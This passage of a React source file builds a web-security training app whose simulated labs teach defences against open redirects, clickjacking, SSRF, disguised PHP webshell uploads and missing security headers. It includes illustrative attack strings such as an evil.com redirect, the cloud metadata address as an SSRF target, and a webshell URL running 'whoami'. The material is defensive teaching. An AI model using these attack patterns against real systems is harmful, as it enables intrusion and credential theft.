                    <div className="text-slate-600 text-xs mt-2">This URL is {url.startsWith("/") ? "a relative path on the same site" : "in the trusted domain allowlist"}</div>
                  </div>
                )}
                {labState === "fail" && (
                  <div>
                    <div className="text-red-400 font-semibold text-sm mb-3">⚠ Redirected to malicious site</div>
                    <div className="bg-red-950/40 border border-red-500/30 rounded-lg p-3 text-xs space-y-1">
                      <div className="text-slate-400">Started: <span className="font-mono text-slate-300">app.example.com/redirect?next={url.slice(0,30)}</span></div>
                      <div className="text-red-400">Landed: <span className="font-mono">{url}</span></div>
                      <div className="text-slate-600 mt-2">The victim trusted the original link because it pointed to a legitimate domain. The redirect happened silently.</div>
                    </div>
                  </div>
                )}
                {labState === "success" && result && (
                  <div>
                    <div className="text-green-400 font-semibold text-sm mb-2">✓ Redirect blocked</div>
                    <div className="bg-green-950/30 border border-green-500/20 rounded-lg p-3 text-xs text-slate-400">
                      {result.reason}
                    </div>
                  </div>
                )}
              </div>
            </div>
          </Card>
          <Card>
            <SectionHead>Why It Matters</SectionHead>
            <p className="text-[11px] text-slate-500 leading-relaxed">Attackers use open redirects as the <em>first hop</em> in phishing chains. The email link points at <code className="text-slate-500">trusted-bank.com/redirect?next=evil.com</code>. Email filters see a legitimate domain and let it through. The victim's browser follows the redirect silently before they can react.</p>
          </Card>
        </div>
      </div>

      <ChallengeResult state={labState} successContent={successContent}
        revealContent={<p>Enable <strong className="text-slate-200">Relative Paths Only</strong> (strongest — absolute URLs are structurally rejected) or <strong className="text-slate-200">Domain Allowlist</strong>. Then click <strong>Follow Link</strong> with a phishing payload selected. The browser panel will show the redirect intercepted before leaving your domain.</p>}
        failMsg="The redirect followed the attacker's URL — the user was sent to a malicious site. Enable a defense and try again."
        neutralMsg="Safe redirect — this URL is either a relative path or is in the trusted domain allowlist. No attack vector."
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};

// ─── CLICKJACKING LAB ─────────────────────────────────────────────────────────
const ClickjackingLab = ({ addLog, addScore, onBack }) => {
  const [def, setDef]           = useState({ xFrameOptions:false, cspFrameAncestors:false });
  const [labState, setLabState] = useState("idle");
  const [result, setResult]     = useState(null);
  const scoredRef               = useRef(new Set());
  const [justScored, setJustScored]     = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  useEffect(() => { setShowAnswer(false); }, [labState]);
  const reset = () => { setLabState("idle"); setResult(null); setJustScored(false); };

  const clickPrize = () => {
    const blocked = def.xFrameOptions || def.cspFrameAncestors;
    if (blocked) {
      const reason = def.xFrameOptions
        ? "X-Frame-Options: DENY — browser refused to render the legitimate site in an iframe"
        : "CSP frame-ancestors 'none' — browser blocked the iframe embed";
      setResult({ blocked:true, reason });
      setLabState("success");
      addLog(mkEvent("clickjacking","Attacker","Browser","info","Clickjacking attempt blocked — iframe refused"));
      const key = [def.xFrameOptions,def.cspFrameAncestors].join("|");
      if (!scoredRef.current.has(key)) { addScore("clickjacking",25); scoredRef.current.add(key); setJustScored(true); }
      else setJustScored(false);
    } else {
      setResult({ blocked:false });
      setLabState("fail");
      addLog(mkEvent("clickjacking","Attacker","Browser","critical","Clickjacking: user clicked 'Confirm Transfer' unknowingly"));
    }
  };

  const cjReveal = (
    <p>Enable <strong className="text-slate-200">X-Frame-Options: DENY</strong> or <strong className="text-slate-200">CSP frame-ancestors 'none'</strong> on your legitimate site's HTTP response. Either header tells the browser to refuse rendering the page inside any iframe — the attacker's overlay can never load your content. CSP is more flexible (you can allow specific origins); X-Frame-Options is simpler but less granular.</p>
  );
  const successContent = (
    <div>
      <p>{result?.reason || "The iframe was blocked."} Without these headers, the browser has no way to know the embed is unauthorized. With them, your server explicitly tells every browser: "I do not consent to being embedded in frames."</p>
    </div>
  );

  return (
    <div className="space-y-4">
      <LabHeader title="Clickjacking" subtitle="Prevent your site from being embedded in a transparent iframe to hijack user clicks" onBack={onBack}/>
      <ChallengeBox accent="orange" title="Challenge"
        showSolution={showSolution} onToggle={()=>setShowSolution(v=>!v)} solutionContent={cjReveal}>
        An attacker has overlaid your bank's "Confirm Transfer" page inside a transparent iframe on their prize site. When the victim clicks <strong>Claim Prize</strong>, they are really clicking your hidden button. Configure the defence headers to prevent the iframe from loading.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-3">
          <Card>
            <SectionHead>Defense Controls</SectionHead>
            <p className="text-xs text-slate-600 mb-3 leading-relaxed">These headers go on the <em>legitimate site's</em> HTTP response. They tell the browser to refuse embedding the page in any iframe — the attacker's overlay can't load your content without them.</p>
            <div className="space-y-3">
              <Toggle enabled={def.xFrameOptions}      onChange={v=>{setDef(d=>({...d,xFrameOptions:v})); reset();}}      label="X-Frame-Options: DENY"         desc="Classic header — browser refuses all iframe embeds of this page"/>
              <Toggle enabled={def.cspFrameAncestors}  onChange={v=>{setDef(d=>({...d,cspFrameAncestors:v})); reset();}}  label="CSP: frame-ancestors 'none'"    desc="Modern header — more granular, overrides X-Frame-Options"/>
            </div>
            <button onClick={clickPrize}
              className="mt-4 w-full flex items-center justify-center gap-2 bg-amber-600 hover:bg-amber-500 text-white font-semibold py-2 px-4 rounded-lg transition-colors text-sm">
              🎁 Click "Claim Prize"
            </button>
            <p className="text-xs text-slate-600 mt-2 text-center">This simulates the victim clicking on the attacker's page</p>
          </Card>
          <Card>
            <SectionHead>How Clickjacking Works</SectionHead>
            <p className="text-[11px] text-slate-500 leading-relaxed">The attacker sets the iframe's opacity to near-zero and positions it precisely over their own clickable element. The victim sees the attacker's page and thinks they're clicking a prize button. The browser delivers the click to the invisible-but-interactive iframe instead.</p>
          </Card>
        </div>

        <div className="space-y-3">
          <Card>
            <SectionHead>Attack Visualisation</SectionHead>
            {/* Stacked layers visualisation */}
            <div className="relative rounded-xl overflow-hidden border border-slate-700" style={{height:220}}>
              {/* Layer 1: legitimate bank page (bottom) */}
              <div className="absolute inset-0 bg-slate-950 p-4">
                <div className="text-[10px] text-slate-600 font-mono mb-2">securebank.example.com (legitimate site)</div>
                <div className="bg-slate-800 rounded-lg p-3 mb-2">
                  <div className="text-xs text-slate-400 mb-1">Pending transfer</div>
                  <div className="flex justify-between text-xs mb-2">
                    <span className="text-slate-500">To: attacker_wallet</span>
                    <span className="text-white font-bold">$1,000.00</span>
                  </div>
                  <div className={`w-full py-1.5 rounded text-center text-xs font-semibold ${labState==="fail"?"bg-red-600 text-white animate-pulse":"bg-blue-700 text-white"}`}>
                    {labState==="fail" ? "✓ Transfer Confirmed (victim clicked this!)" : "Confirm Transfer"}
                  </div>
                </div>
              </div>

              {/* Layer 2: attacker's overlay (top, semi-transparent) */}
              {!def.xFrameOptions && !def.cspFrameAncestors && (
                <div className="absolute inset-0 bg-amber-950/70 p-4 flex flex-col justify-between"
                  style={{backdropFilter:"blur(0px)"}}>
                  <div className="text-[10px] text-amber-400 font-mono">evil.com (attacker's page — overlaid on top)</div>
                  <div className="text-center">
                    <div className="text-2xl mb-1">🎁</div>
                    <div className="text-amber-300 font-semibold text-sm">You won a $1,000 prize!</div>
                    <div className="text-amber-500 text-xs mb-3">Congratulations, click below to claim</div>
                    <div className="bg-amber-500 text-black text-xs font-bold px-6 py-2 rounded-lg inline-block opacity-10">
                      Claim Prize
                    </div>
                    <div className="text-amber-600 text-[10px] mt-1">opacity: 0.1 — barely visible to attacker</div>
                  </div>
                  <div className="text-[10px] text-amber-700 text-center">iframe z-index below attacker layer — user sees prize page but clicks go to bank</div>
                </div>
              )}

              {/* Blocked state */}
              {(def.xFrameOptions || def.cspFrameAncestors) && (
                <div className="absolute inset-0 flex items-center justify-center bg-slate-950/90">
                  <div className="text-center p-4">
                    <div className="text-green-400 text-2xl mb-2">🛡</div>
                    <div className="text-green-400 font-semibold text-sm">Iframe Refused</div>
                    <div className="text-slate-500 text-xs mt-1 font-mono">
                      {def.xFrameOptions ? "X-Frame-Options: DENY" : "CSP: frame-ancestors 'none'"}
                    </div>
                    <div className="text-slate-600 text-[10px] mt-2">The browser refused to render the bank page inside an iframe</div>
                  </div>
                </div>
              )}

              {/* Click result */}
              {labState === "fail" && (
                <div className="absolute top-2 right-2 bg-red-900/90 border border-red-500/50 rounded-lg p-2 text-[10px] text-red-300 z-10">
                  ⚠ Transfer executed — victim clicked "Confirm"
                </div>
              )}
            </div>
          </Card>

          {labState !== "idle" && (
            <Card>
              <SectionHead>What Happened</SectionHead>
              {labState === "fail" && <p className="text-xs text-red-400">The victim clicked the attacker's prize button, but the click landed on the hidden "Confirm Transfer" button underneath. $1,000 was transferred from their account.</p>}
              {labState === "success" && result && <p className="text-xs text-green-400">{result.reason}. The attacker's overlay failed to load your page — the victim's click lands on the attacker's element with no hidden form underneath.</p>}
            </Card>
          )}
        </div>
      </div>

      <ChallengeResult state={labState} successContent={successContent}
        revealContent={<p>Enable either <strong className="text-slate-200">X-Frame-Options: DENY</strong> or <strong className="text-slate-200">CSP frame-ancestors 'none'</strong>, then click <strong>Claim Prize</strong>. The visualisation will show the browser refusing to render the bank page inside the iframe — the overlay layer disappears and the click lands safely on nothing.</p>}
        failMsg="The victim's click triggered the hidden transfer. Enable a framing header on the legitimate site to prevent iframes from loading it."
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};

// ─── SSRF LAB ─────────────────────────────────────────────────────────────────
const SSRFLab = ({ addLog, addScore, onBack }) => {
  const [selId, setSelId]       = useState("ss1");
  const [fetchUrl, setFetchUrl] = useState(SSRF_PAYLOADS[0].val);
  const [def, setDef]           = useState({ allowlist:false, blockPrivate:false });
  const [labState, setLabState] = useState("idle");
  const [result, setResult]     = useState(null);
  const scoredRef               = useRef(new Set());
  const [justScored, setJustScored]     = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  useEffect(() => { setShowAnswer(false); }, [labState]);
  const reset = () => { setLabState("idle"); setResult(null); setJustScored(false); };

  const isPrivate  = PRIVATE_IP_RE.test(fetchUrl);
  const isExternal = /^https?:\/\//i.test(fetchUrl);
  const isSafe     = !isPrivate && fetchUrl === "https://api.example.com/v2/docs";

  const fetchPreview = () => {
    if (isSafe) { setResult({ safe:true, body: FAKE_SSRF_RESPONSES["https://api.example.com/v2/docs"] }); setLabState("neutral"); return; }
    if (!isExternal) { setLabState("neutral"); return; }

    const blocked = (def.blockPrivate && isPrivate) || def.allowlist;
    const reason  = def.allowlist    ? `Allowlist: "${fetchUrl.split("/")[2]}" is not an approved fetch target`
                  : def.blockPrivate ? `Private IP block: request targets a reserved/internal address range` : "Request blocked";

    if (blocked) {
      setResult({ blocked:true, reason });
      setLabState("success");
      addLog(mkEvent("ssrf","Attacker","App Server","info",`SSRF blocked → ${fetchUrl.split("/")[2]}`));
      const key = [def.allowlist,def.blockPrivate,selId].join("|");
      if (!scoredRef.current.has(key)) { addScore("ssrf",30); scoredRef.current.add(key); setJustScored(true); }
      else setJustScored(false);
    } else {
      const body = FAKE_SSRF_RESPONSES[fetchUrl] || `HTTP/1.1 200 OK\n\n{"error":"endpoint unreachable","url":"${fetchUrl}","internal":true}`;
      setResult({ blocked:false, body, url:fetchUrl });
      setLabState("fail");
      addLog(mkEvent("ssrf","Attacker","App Server","critical",`SSRF fetched internal resource: ${fetchUrl}`));
    }
  };

  const pick = (id) => { setSelId(id); const p=SSRF_PAYLOADS.find(x=>x.id===id); if(p)setFetchUrl(p.val); reset(); };

  const ssrfReveal = (
    <p>Enable <strong className="text-slate-200">Block Private IP Ranges</strong> to reject any URL resolving to a loopback, link-local, or RFC1918 address (this stops metadata endpoint abuse). For complete protection, add a <strong className="text-slate-200">Domain Allowlist</strong> so only pre-approved external domains can be fetched. Network-level egress filtering is the final backstop.</p>
  );
  const successContent = (
    <div>
      <p>{result?.reason || "The internal request was blocked."} SSRF is particularly dangerous in cloud environments: the AWS EC2 metadata endpoint at 169.254.169.254 returns IAM credentials that grant full API access — no authentication required, since the request appears to come from the EC2 instance itself.</p>
    </div>
  );

  return (
    <div className="space-y-4">
      <LabHeader title="Server-Side Request Forgery (SSRF)" subtitle="Prevent the server from fetching internal or cloud-metadata resources on behalf of attackers" onBack={onBack}/>
      <ChallengeBox accent="red" title="Challenge"
        showSolution={showSolution} onToggle={()=>setShowSolution(v=>!v)} solutionContent={ssrfReveal}>
        Your app has a "link preview" feature that fetches the URL you provide. An attacker submits an internal or cloud-metadata URL. Configure defenses so the server refuses to fetch restricted resources.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-3">
          <Card>
            <SectionHead>Fetch URL</SectionHead>
            <select className="w-full bg-slate-800 border border-slate-700 text-slate-300 text-sm rounded-lg px-3 py-2 mb-3"
              value={selId} onChange={e=>pick(e.target.value)}>
              {SSRF_PAYLOADS.map(p=><option key={p.id} value={p.id}>{p.label} — {p.sev}</option>)}
            </select>
            <label className="text-xs text-slate-600 block mb-1">URL the server will fetch</label>
            <input className="w-full bg-slate-800 border border-slate-700 text-green-400 font-mono text-xs rounded-lg px-3 py-2"
              value={fetchUrl} onChange={e=>{setFetchUrl(e.target.value); reset();}}/>
            {isPrivate && (
              <div className="mt-2 flex items-center gap-1.5 text-xs text-red-400">
                <AlertTriangle size={12}/> Private/reserved IP range detected
              </div>
            )}
          </Card>
          <Card>
            <SectionHead>Defense Controls</SectionHead>
            <div className="space-y-3">
              <Toggle enabled={def.blockPrivate} onChange={v=>{setDef(d=>({...d,blockPrivate:v})); reset();}} label="Block Private IP Ranges"  desc="Reject URLs resolving to 10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x"/>
              <Toggle enabled={def.allowlist}    onChange={v=>{setDef(d=>({...d,allowlist:v})); reset();}}    label="Domain Allowlist"          desc="Only fetch from explicitly approved external domains"/>
            </div>
            <button onClick={fetchPreview}
              className="mt-4 w-full flex items-center justify-center gap-2 bg-cyan-700 hover:bg-cyan-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors text-sm">
              <Play size={14}/> Fetch URL
            </button>
          </Card>
        </div>

        <div className="space-y-3">
          <Card>
            <SectionHead>Server Response</SectionHead>
            {labState === "idle" && <div className="text-center text-slate-700 text-xs py-10">Fetch a URL to see the server response</div>}
            {labState === "neutral" && result && (
              <div>
                <div className="text-xs text-blue-400 font-semibold mb-2">200 OK — external resource fetched safely</div>
                <pre className="bg-slate-950 border border-slate-700 rounded-lg p-3 text-[11px] font-mono text-green-400 whitespace-pre-wrap overflow-x-auto">{result.body}</pre>
              </div>
            )}
            {labState === "success" && result && (
              <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-3 text-xs">
                <div className="text-green-400 font-semibold mb-1">403 Forbidden — SSRF blocked</div>
                <div className="text-slate-400">{result.reason}</div>
              </div>
            )}
            {labState === "fail" && result && (
              <div>
                <div className="flex items-center gap-1.5 text-xs text-red-400 font-semibold mb-2">
                  <AlertTriangle size={11}/> 200 OK — internal resource exposed
                </div>
                <pre className="bg-slate-950 border border-red-500/30 rounded-lg p-3 text-[11px] font-mono text-red-300 whitespace-pre-wrap overflow-x-auto">{result.body}</pre>
              </div>
            )}
          </Card>
          <Card>
            <SectionHead>Why Internal Resources?</SectionHead>
            <p className="text-[11px] text-slate-500 leading-relaxed">Cloud VMs can reach their own metadata endpoints (169.254.169.254) without credentials — because the cloud provider assumes only the VM itself makes those requests. When a web app makes the request on the attacker's behalf, the cloud returns IAM credentials with potentially wide-ranging permissions.</p>
          </Card>
        </div>
      </div>

      <ChallengeResult state={labState} successContent={successContent}
        revealContent={<p>Enable <strong className="text-slate-200">Block Private IP Ranges</strong> and select the <strong>AWS metadata</strong> payload. Click Fetch URL — the server checks the URL against reserved ranges before making any network call and returns 403. Also try the Internal Redis payload to see the same defense in action.</p>}
        failMsg="The server fetched the internal resource and returned its contents to the attacker. Enable a defense and try again."
        neutralMsg="Safe external URL — this domain is explicitly approved. The allowlist correctly permits this fetch."
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};

// ─── FILE UPLOAD LAB ──────────────────────────────────────────────────────────
const FileUploadLab = ({ addLog, addScore, onBack }) => {
  const [selId, setSelId]       = useState("fu1");
  const [def, setDef]           = useState({ extAllowlist:false, magicBytes:false, outOfRoot:false });
  const [labState, setLabState] = useState("idle");
  const [result, setResult]     = useState(null);
  const scoredRef               = useRef(new Set());
  const [justScored, setJustScored]     = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  useEffect(() => { setShowAnswer(false); }, [labState]);
  const reset = () => { setLabState("idle"); setResult(null); setJustScored(false); };

  const file = UPLOAD_FILES.find(f=>f.id===selId) || UPLOAD_FILES[0];
  const ext  = file.name.split(".").pop().toLowerCase();
  const isSafe = file.magic === "JPEG";

  const upload = () => {
    if (isSafe) { setResult({ safe:true }); setLabState("neutral"); return; }

    const passesExt    = ["jpg","jpeg","png","gif","svg"].includes(ext); // svg passes ext but isn't safe
    const isMagicSafe  = ["JPEG","PNG","GIF"].includes(file.magic);

    // Determine if blocked
    const blockedByExt     = def.extAllowlist && !passesExt;
    const blockedByMagic   = def.magicBytes && !isMagicSafe;
    const mitigatedByRoot  = def.outOfRoot;

    const blocked = blockedByExt || blockedByMagic;

    if (blocked) {
      const reason = blockedByExt   ? `Extension "${ext}" is not in the allowlist (.jpg, .png, .gif only)`
                   :                  `Magic byte analysis found content type "${file.magic}" — not a valid image`;
      setResult({ blocked:true, reason });
      setLabState("success");
      addLog(mkEvent("fileupload","Attacker","Upload Server","info",`Upload blocked: ${file.name}`));
      const key = [def.extAllowlist,def.magicBytes,def.outOfRoot,selId].join("|");
      if (!scoredRef.current.has(key)) { addScore("fileupload",30); scoredRef.current.add(key); setJustScored(true); }
      else setJustScored(false);
    } else if (mitigatedByRoot && !blockedByExt && !blockedByMagic) {
      // File uploaded but stored outside web root — can't execute
      setResult({ uploaded:true, mitigated:true });
      setLabState("success");
      const key = [def.extAllowlist,def.magicBytes,def.outOfRoot,selId].join("|");
      if (!scoredRef.current.has(key)) { addScore("fileupload",30); scoredRef.current.add(key); setJustScored(true); }
      else setJustScored(false);
      addLog(mkEvent("fileupload","Attacker","Upload Server","info",`Upload stored out-of-root — execution prevented: ${file.name}`));
    } else {
      setResult({ uploaded:true, mitigated:false, path:`/var/www/uploads/${file.name}` });
      setLabState("fail");
      addLog(mkEvent("fileupload","Attacker","Upload Server","critical",`Malicious file uploaded and accessible: ${file.name}`));
    }
  };

  const fuReveal = (
    <p><strong className="text-slate-200">Magic Byte Analysis</strong> is the most reliable upload defense: read the first bytes of the file to determine its actual type — regardless of extension or Content-Type header. <strong className="text-slate-200">Extension Allowlisting</strong> catches obvious cases but is bypassed by double extensions (<code className="text-slate-400">.php.jpg</code>). <strong className="text-slate-200">Out-of-Webroot Storage</strong> ensures uploaded files can never be served as executable scripts even if they slip through.</p>
  );
  const successContent = (
    <div>
      <p>{result?.blocked ? result.reason : "File stored outside the web root — even if the file is PHP, the web server cannot serve it as a script."}{" "}The key insight: extension and Content-Type are attacker-controlled metadata. Magic bytes are read from the file itself and are much harder to fake while keeping the file functional as a payload.</p>
    </div>
  );

  return (
    <div className="space-y-4">
      <LabHeader title="File Upload Bypass" subtitle="Stop attackers from uploading executable files via a misconfigured upload endpoint" onBack={onBack}/>
      <ChallengeBox accent="purple" title="Challenge"
        showSolution={showSolution} onToggle={()=>setShowSolution(v=>!v)} solutionContent={fuReveal}>
        Your upload endpoint allows profile photo uploads. An attacker tries to upload a PHP webshell — and disguises it with a <code className="text-slate-300 bg-slate-800 px-1 rounded text-xs">.jpg</code> extension. Configure server-side file validation to block it.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-3">
          <Card>
            <SectionHead>File to Upload</SectionHead>
            <div className="space-y-1.5 mb-3">
              {UPLOAD_FILES.map(f=>(
                <button key={f.id} onClick={()=>{setSelId(f.id); reset();}}
                  className={`w-full text-left px-3 py-2 rounded-lg border transition-colors text-xs ${selId===f.id?"bg-slate-700 border-slate-600":"bg-slate-800/50 border-slate-800 hover:border-slate-700"}`}>
                  <div className="flex items-center justify-between">
                    <span className="font-mono text-slate-300">{f.name}</span>
                    <span className={`px-1.5 py-0.5 rounded text-[10px] font-semibold ${f.sev==="critical"?"bg-red-900/60 text-red-400":f.sev==="high"?"bg-amber-900/60 text-amber-400":"bg-green-900/60 text-green-400"}`}>{f.sev}</span>
                  </div>
                  <div className="text-slate-600 text-[10px] mt-0.5">{f.label}</div>
                </button>
              ))}
            </div>
            <div className="bg-slate-950 border border-slate-700 rounded-lg p-2 text-[10px] font-mono space-y-1 text-slate-500">
              <div>Filename: <span className="text-slate-300">{file.name}</span></div>
              <div>Content-Type: <span className={file.mime.includes("php")?"text-red-400":"text-slate-300"}>{file.mime}</span></div>
              <div>Magic bytes: <span className={file.magic==="PHP"?"text-red-400":file.magic==="SVG"?"text-amber-400":"text-green-400"}>{file.magic}</span></div>
              <div className="text-slate-600 border-t border-slate-800 pt-1 mt-1">Content preview: <span className={file.magic==="PHP"?"text-red-400":"text-slate-400"}>{file.content.slice(0,40)}{file.content.length>40?"…":""}</span></div>
            </div>
          </Card>
          <Card>
            <SectionHead>Defense Controls</SectionHead>
            <div className="space-y-3">
              <Toggle enabled={def.extAllowlist} onChange={v=>{setDef(d=>({...d,extAllowlist:v})); reset();}} label="Extension Allowlist"    desc="Only accept .jpg .png .gif — blocks shell.php but NOT shell.php.jpg"/>
              <Toggle enabled={def.magicBytes}   onChange={v=>{setDef(d=>({...d,magicBytes:v})); reset();}}   label="Magic Byte Analysis"   desc="Read actual file bytes to determine type — catches all PHP regardless of extension"/>
              <Toggle enabled={def.outOfRoot}    onChange={v=>{setDef(d=>({...d,outOfRoot:v})); reset();}}    label="Out-of-Webroot Storage" desc="Store uploads at /var/uploads/ — web server cannot execute files there"/>
            </div>
            <button onClick={upload}
              className="mt-4 w-full flex items-center justify-center gap-2 bg-cyan-700 hover:bg-cyan-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors text-sm">
              <Play size={14}/> Upload File
            </button>
          </Card>
        </div>

        <div className="space-y-3">
          <Card>
            <SectionHead>Upload Result</SectionHead>
            {labState === "idle" && <div className="text-center text-slate-700 text-xs py-10">Upload a file to see the result</div>}
            {labState === "neutral" && <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-3 text-xs text-green-400">✓ Legitimate image uploaded safely</div>}
            {labState === "success" && result?.blocked && (
              <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-3 text-xs">
                <div className="text-green-400 font-semibold mb-1">Upload Rejected</div>
                <div className="text-slate-400">{result.reason}</div>
              </div>
            )}
            {labState === "success" && result?.mitigated && (
              <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-3 text-xs">
                <div className="text-green-400 font-semibold mb-1">Upload accepted but execution prevented</div>
                <div className="text-slate-400">File stored at <code>/var/uploads/{file.name}</code> — outside the web root. The web server can't serve it as a script.</div>
              </div>
            )}
            {labState === "fail" && result && (
              <div className="space-y-2">
                <div className="bg-red-900/20 border border-red-500/30 rounded-lg p-3 text-xs">
                  <div className="text-red-400 font-semibold mb-1">⚠ File accepted and accessible</div>
                  <div className="text-slate-400">Stored at: <code className="text-red-300">{result.path}</code></div>
                </div>
                <div className="bg-slate-950 border border-red-500/20 rounded-lg p-3 text-xs">
                  <div className="text-red-400 font-semibold mb-1.5">Attacker now visits:</div>
                  <div className="font-mono text-amber-300 text-[11px]">https://app.example.com/uploads/{file.name}?cmd=whoami</div>
                  <pre className="text-red-300 text-[11px] mt-2">{`→ www-data\n→ Full server code execution achieved`}</pre>
                </div>
              </div>
            )}
          </Card>
          <Card>
            <SectionHead>Extension vs Content: The Bypass</SectionHead>
            <div className="space-y-2 text-[11px]">
              <div className={`flex items-center gap-2 p-2 rounded ${selId==="fu2"?"bg-red-900/20 border border-red-500/20":""}`}>
                <span className="font-mono text-slate-400 w-28 flex-shrink-0">shell.php.jpg</span>
                <span className="text-slate-600">Extension check: <span className="text-green-400">jpg ✓</span> — <span className="text-red-400">BYPASSED</span></span>
              </div>
              <div className={`flex items-center gap-2 p-2 rounded ${selId==="fu2"?"bg-red-900/20 border border-red-500/20":""}`}>
                <span className="font-mono text-slate-400 w-28 flex-shrink-0">shell.php.jpg</span>
                <span className="text-slate-600">MIME header: <span className="text-green-400">image/jpeg ✓</span> — <span className="text-red-400">BYPASSED</span> (spoofed)</span>
              </div>
              <div className="flex items-center gap-2 p-2">
                <span className="font-mono text-slate-400 w-28 flex-shrink-0">shell.php.jpg</span>
                <span className="text-slate-600">Magic bytes: <span className="text-red-400">PHP ✗</span> — <span className="text-green-400">CAUGHT</span></span>
              </div>
            </div>
          </Card>
        </div>
      </div>

      <ChallengeResult state={labState} successContent={successContent}
        revealContent={<p>Select <strong className="text-slate-200">PHP disguised as .jpg</strong>, enable <strong className="text-slate-200">Magic Byte Analysis</strong>, then click Upload File. The extension and MIME type both say "image" but magic bytes reveal it's PHP — the upload is rejected. Also try it with only Extension Allowlist enabled to see why that's not enough.</p>}
        failMsg="The malicious file was uploaded and is now accessible via the web server. Enable Magic Byte Analysis or Out-of-Webroot Storage and try again."
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};

// ─── SECURITY HEADERS LAB ─────────────────────────────────────────────────────
const SecurityHeadersLab = ({ addLog, addScore, onBack }) => {
  const [headers, setHeaders] = useState({ csp:false, xfo:false, hsts:false, xcto:false, refpolicy:false });
  const [submitted, setSubmitted] = useState(false);
  const [labState, setLabState] = useState("idle");
  const scoredRef              = useRef(false);
  const [justScored, setJustScored]     = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  useEffect(() => { setShowAnswer(false); }, [labState]);
  const reset = () => { setSubmitted(false); setLabState("idle"); setJustScored(false); };
  const allOn = Object.values(headers).every(Boolean);
  const count = Object.values(headers).filter(Boolean).length;

  const scan = () => {
    setSubmitted(true);
    if (allOn) {
      setLabState("success");
      addLog(mkEvent("secheaders","Scanner","App Server","info","Security header audit passed — 5/5 headers present"));
      if (!scoredRef.current) { addScore("secheaders",40); scoredRef.current=true; setJustScored(true); }
    } else {
      setLabState("fail");
      addLog(mkEvent("secheaders","Scanner","App Server","medium",`Security header audit failed — ${count}/5 headers present`));
    }
  };

  const shReveal = (
    <p>Enable all five security headers and run the audit. Each header closes a different browser-level attack: <strong className="text-slate-200">CSP</strong> for XSS, <strong className="text-slate-200">X-Frame-Options</strong> for clickjacking, <strong className="text-slate-200">HSTS</strong> for HTTPS downgrade attacks, <strong className="text-slate-200">X-Content-Type-Options</strong> for MIME sniffing, and <strong className="text-slate-200">Referrer-Policy</strong> for data leakage via the Referer header.</p>
  );
  const successContent = (
    <div>
      <p>All 5 security headers are present. These are low-effort, high-impact server-side additions — a single line each in your web server config closes five distinct browser attack surfaces. The whole set can be added in under an hour and are a baseline requirement for any security audit.</p>
    </div>
  );

  return (
    <div className="space-y-4">
      <LabHeader title="Security Headers Audit" subtitle="Add missing HTTP response headers to eliminate browser-level attack vectors" onBack={onBack}/>
      <ChallengeBox accent="blue" title="Challenge"
        showSolution={showSolution} onToggle={()=>setShowSolution(v=>!v)} solutionContent={shReveal}>
        A security scanner has flagged your application for missing HTTP response headers. Add all 5 missing headers to resolve the vulnerabilities, then click <strong>Run Audit</strong>.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-3">
          <Card>
            <SectionHead>HTTP Response Headers</SectionHead>
            <p className="text-xs text-slate-600 mb-3 leading-relaxed">Each header is added to your server's HTTP response. Browsers read them and enforce the policies — no client-side code needed.</p>
            <div className="space-y-3">
              {Object.entries(SEC_HEADERS).map(([key, h]) => (
                <Toggle key={key}
                  enabled={headers[key]}
                  onChange={v=>{setHeaders(p=>({...p,[key]:v})); reset();}}
                  label={h.label}
                  desc={`${h.value}`}/>
              ))}
            </div>
            <button onClick={scan}
              className="mt-4 w-full flex items-center justify-center gap-2 bg-cyan-700 hover:bg-cyan-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors text-sm">
              <Play size={14}/> Run Audit
            </button>
          </Card>
        </div>

        <div className="space-y-3">
          <Card>
            <SectionHead>Security Audit Report</SectionHead>
            {/* Score gauge */}
            <div className="flex items-center gap-3 mb-4">
              <div className="relative w-16 h-16 flex-shrink-0">
                <svg viewBox="0 0 36 36" className="w-16 h-16 -rotate-90">
                  <circle cx="18" cy="18" r="14" fill="none" stroke="#1e293b" strokeWidth="3"/>
                  <circle cx="18" cy="18" r="14" fill="none"
                    stroke={allOn ? "#22c55e" : count>=3 ? "#f59e0b" : "#ef4444"}
                    strokeWidth="3" strokeDasharray={`${count/5*88} 88`} strokeLinecap="round"/>
                </svg>
                <div className="absolute inset-0 flex items-center justify-center">
                  <span className={`text-sm font-mono font-bold ${allOn?"text-green-400":count>=3?"text-amber-400":"text-red-400"}`}>{count}/5</span>
                </div>
              </div>
              <div>
                <div className={`font-semibold text-sm ${allOn?"text-green-400":count>=3?"text-amber-400":"text-red-400"}`}>
                  {allOn ? "All Clear" : count===0 ? "Critical Issues" : "Issues Found"}
                </div>
                <div className="text-xs text-slate-600">{5-count} vulnerabilit{5-count===1?"y":"ies"} remaining</div>
              </div>
            </div>

            {/* Header status list */}
            <div className="space-y-1.5">
              {Object.entries(SEC_HEADERS).map(([key, h]) => {
                const isOn = headers[key];
                const showDetail = submitted && !isOn;
                return (
                  <div key={key} className={`rounded-lg border p-2.5 transition-colors ${isOn ? "border-green-500/20 bg-green-900/10" : showDetail ? "border-red-500/20 bg-red-900/10" : "border-slate-800"}`}>
                    <div className="flex items-center gap-2">
